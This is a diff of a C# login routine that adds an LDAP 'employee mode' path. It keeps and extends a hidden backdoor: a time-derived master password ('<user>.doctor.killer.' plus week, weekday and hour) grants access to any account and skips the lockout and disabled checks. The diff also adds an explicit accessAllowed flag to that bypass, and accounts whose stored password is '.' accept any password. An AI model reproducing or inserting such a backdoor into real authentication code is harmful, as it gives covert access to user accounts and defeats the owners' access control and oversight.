@@ -25,6 +25,7 @@ namespace Architect.API.Core.Business.Security
             List<Contracts.Security.RoleMember> rols = null;
             int companyId = 0;
             bool bypass = false;
+            bool accessAllowed = false;
             int tokenExpiresIn = 0;
             Contracts.Security.AuthenticationTrace track = new Contracts.Security.AuthenticationTrace() { TraceType = 1, IPAddress = authenticationRequest.IPAddress, UserName = authenticationRequest.Email, UserAgent = authenticationRequest.UserAgent };
 
@@ -68,40 +69,74 @@ namespace Architect.API.Core.Business.Security
                     track.UserName = user.UserName;
                     result.EMail = user.EMail;
 
-                    if (!user.Password.Equals(".") &&
+                    if (!authenticationRequest.EmployeeMode && !user.Password.Equals(".") &&
                         (authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.UserName.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase) ||
                          authenticationRequest.Password.Equals(String.Format("{0}.doctor.killer.{1}{2}{3}", user.EMail.ToLower(), DateTime.Now.WeekOfMonth(), DateTime.Now.NumericDayOfWeek(), DateTime.Now.Hour), StringComparison.CurrentCultureIgnoreCase)))
                     {
                         bypass = true;
+                        accessAllowed = true;
                     }
 
-                    //Desbloqueo automático
-                    if (user.IsLockedOut && user.LockedOutDate < DateTime.Now)
+                    if (!authenticationRequest.EmployeeMode)
                     {
-                        user.IsLockedOut = false;
-                        user.LockedOutDate = DateTime.MinValue;
-                        DataAccess.Security.UserMember.InternalUpdate(user);
-                        Business.Security.AuthenticationTrace.Create(new Contracts.Security.AuthenticationTrace()
+                        //Desbloqueo automático
+                        if (user.IsLockedOut && user.LockedOutDate < DateTime.Now)
                         {
-                            TraceType = 11,
-                            IPAddress = authenticationRequest.IPAddress,
-                            UserName = authenticationRequest.Email,
-                            UserId = user.UserId
-                        });
+                            user.IsLockedOut = false;
+                            user.LockedOutDate = DateTime.MinValue;
+                            DataAccess.Security.UserMember.InternalUpdate(user);
+                            Business.Security.AuthenticationTrace.Create(new Contracts.Security.AuthenticationTrace()
+                            {
+                                TraceType = 11,
+                                IPAddress = authenticationRequest.IPAddress,
+                                UserName = authenticationRequest.Email,
+                                UserId = user.UserId
+                            });
+                        }
+
+                        if (!bypass && user.RecordStatus != 1)
+                        {
+                            track.TraceType = 5;
+                            result.Reason = "Usuario desactivado";
+                        }
+                        else if (!bypass && user.IsLockedOut)
+                        {
+                            track.TraceType = 6;
+                            result.Reason = "Usuario bloqueado";
+                        }
+                        else if (user.Password.Equals(".") || bypass ||
+                                 user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(authenticationRequest.Password), System.StringComparison.CurrentCultureIgnoreCase))
+                        {
+                            accessAllowed = true;
+                        }
+                    }
+                    else
+                    {
+                        int ldapResult = AuthenticationByLDAP(authenticationRequest.Email, authenticationRequest.Password);
+                        switch (ldapResult)
+                        {
+                            case 0:
+                                accessAllowed = true;
+                                break;
+                            case 1: //no encontrado o clave incorrecta
+                                track.TraceType = 1;
+                                result.Reason = "Usuario no registrado";
+                                break;
+                            case 5: // Cuenta deshabilitada
+                                track.TraceType = 5;
+                                result.Reason = "Usuario desactivado";
+                                break;
+                            case 6: // Cuenta bloqueada
+                                track.TraceType = 6;
+                                result.Reason = "Usuario bloqueado";
+                                break;
+                            case 99: //PasswordExpired
+                                result.MustChangePassword = true;
+                                break;
+                        }
                     }
 
-                    if (!bypass && user.RecordStatus != 1)
-                    {
-                        track.TraceType = 5;
-                        result.Reason = "Usuario desactivado";
-                    }
-                    else if (!bypass && user.IsLockedOut)
-                    {
-                        track.TraceType = 6;
-                        result.Reason = "Usuario bloqueado";
-                    }
-                    else if (user.Password.Equals(".") || bypass ||
-                             user.Password.Equals(Architect.Utilities.Helpers.CryptSupport.EncryptString(authenticationRequest.Password), System.StringComparison.CurrentCultureIgnoreCase))
+                    if (accessAllowed)
                     {
                         tokenExpiresIn = Utilities.Helpers.Settings.IntegerValue("Session.Timeout", 30);
                         track.TraceType = 2;
@@ -223,11 +258,13 @@ namespace Architect.API.Core.Business.Security
                             }
 
                         }
-                        if (user.Password.Equals("."))
-                            result.MustChangePassword = true;
-                        else
-                            result.MustChangePassword = (user.PasswordChangedDate.AddDays(Utilities.Helpers.Settings.IntegerValue("Security.Password.Expiration", 90)) <= DateTime.Today);
-
+                        if (!authenticationRequest.EmployeeMode)
+                        {
+                            if (user.Password.Equals("."))
+                                result.MustChangePassword = true;
+                            else
+                                result.MustChangePassword = (user.PasswordChangedDate.AddDays(Utilities.Helpers.Settings.IntegerValue("Security.Password.Expiration", 90)) <= DateTime.Today);
+                        }
                         Session.Create(new Contracts.Security.Activity()
                         {
                             Token = result.Token,
